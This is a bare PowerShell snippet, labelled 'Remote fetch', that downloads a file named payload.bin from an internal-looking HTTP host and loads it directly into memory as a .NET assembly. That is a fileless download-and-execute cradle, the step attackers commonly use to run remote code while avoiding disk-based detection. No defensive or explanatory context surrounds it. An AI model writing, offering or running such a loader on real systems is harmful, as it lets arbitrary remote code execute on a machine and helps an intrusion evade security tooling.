
<# Remote fetch #> $AssemblyBytes = (New-Object System.Net.WebClient).DownloadData("http://internal.corp:8080/payload.bin"); [Reflection.Assembly]::Load($AssemblyBytes); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
